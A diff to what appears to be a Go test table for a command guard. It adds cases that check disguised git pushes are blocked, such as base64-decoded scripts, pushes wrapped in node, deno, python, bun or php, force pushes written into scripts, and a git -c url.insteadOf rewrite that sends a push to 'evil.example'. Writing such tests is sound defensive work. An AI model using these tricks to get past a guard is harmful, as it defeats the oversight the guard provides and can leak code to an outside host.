@@ -475,6 +475,21 @@ func extraCases() []Case {
 		bash("graphql allowed comment with nested selections", `gh api graphql -f query='mutation { addComment(input: {subjectId: "x", body: "y"}) { commentEdge { node { id } } } }'`, "feat/x", false, ""),
 		bash("curl -sSLo then sh cannot see what curl wrote", "curl -sSLo x.sh u; sh x.sh", "feat/x", true, scriptNotVisible),
 		bash("api POST a review comment reply", "gh api -X POST repos/o/r/pulls/5/comments/7/replies -f body=x", "feat/x", false, ""),
+		bash("graphql # inside a string hides nothing", `gh api graphql -f query='mutation { addComment(input: {subjectId: "x", body: "#"}) { clientMutationId } mergePullRequest(input: {pullRequestId: "x"}) { clientMutationId } }'`, "feat/x", true, "forge write"),
+		bash("base64 output cannot be seen before sh runs it", "base64 -d > x.sh <<<'Z2l0IHB1c2ggb3JpZ2luIG1haW4='; sh x.sh", "feat/x", true, scriptNotVisible),
+		bash("cat copies a heredoc into the script it names", "cat > x.sh <<'EOF'\nls\nEOF\nsh x.sh", "feat/x", false, ""),
+		bash("tee -a adds to a recorded push", "echo 'git push origin main' > x.sh; echo ls | tee -a x.sh; sh x.sh", "feat/x", true, "open a pull request"),
+		bash("echo keeps --force in the script it writes", "echo git push --force origin feat/x > x.sh; sh x.sh", "feat/x", true, "never rewritten"),
+		bash("push -o value is not the repository", "git push -o ci.skip https://github.com/o/r.git feat/x", "feat/x", true, "skips the remote"),
+		bash("push -o to origin stays allowed", "git push -o ci.skip origin feat/x", "feat/x", false, ""),
+		bash("node resolves an extensionless script", "cat > deploy.js <<'EOF'\nrequire('child_process').execSync('git push origin main')\nEOF\nnode deploy", "feat/x", true, interpreterHidesGit),
+		bash("-c remote url sends a push elsewhere", "git -c remote.x.url=https://github.com/o/r.git push x feat/x", "feat/x", true, "another URL"),
+		bash("-c url insteadOf rewrites where a push goes", "git -c url.https://evil.example/.insteadOf=https://github.com/ push origin feat/x", "feat/x", true, "another URL"),
+		bash("deno runs a script without run", "cat > main.ts <<'EOF'\nnew Deno.Command('git', {args: ['push','origin','main']}).outputSync()\nEOF\ndeno main.ts", "feat/x", true, interpreterHidesGit),
+		bash("a python shebang script run by path", "cat > x.py <<'EOF'\n#!/usr/bin/env python3\nimport subprocess\nsubprocess.run(['git','push','origin','main'])\nEOF\n./x.py", "feat/x", true, interpreterHidesGit),
+		bash("deno run hides a git push", "cat > t.ts <<'EOF'\nnew Deno.Command('git', {args: ['push','origin','main']}).outputSync()\nEOF\ndeno run -A t.ts", "feat/x", true, interpreterHidesGit),
+		bash("bun -e hides a git push", `bun -e 'Bun.spawnSync(["git","push","origin","main"])'`, "feat/x", true, interpreterHidesGit),
+		bash("php -r hides a git push", `php -r 'exec("git push origin main");'`, "feat/x", true, interpreterHidesGit),
 	}
 }
 
